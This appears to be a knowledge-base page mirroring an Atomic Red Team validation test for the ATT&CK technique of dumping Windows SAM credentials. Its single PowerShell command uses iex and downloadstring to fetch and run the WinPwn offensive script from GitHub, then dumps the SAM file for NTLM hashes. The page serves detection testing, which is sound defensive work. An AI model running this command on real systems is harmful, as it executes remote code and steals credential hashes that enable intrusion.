---
atomic_guid: "0c0f5f06-166a-4f4d-bb4a-719df9a01dbb"
title: "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.002"
attack_technique_name: "OS Credential Dumping: Security Account Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "0c0f5f06-166a-4f4d-bb4a-719df9a01dbb"
  - "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes

Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn

## Metadata

- Atomic GUID: 0c0f5f06-166a-4f4d-bb4a-719df9a01dbb
- Technique: T1003.002: OS Credential Dumping: Security Account Manager
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1003.002/T1003.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.002]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml)
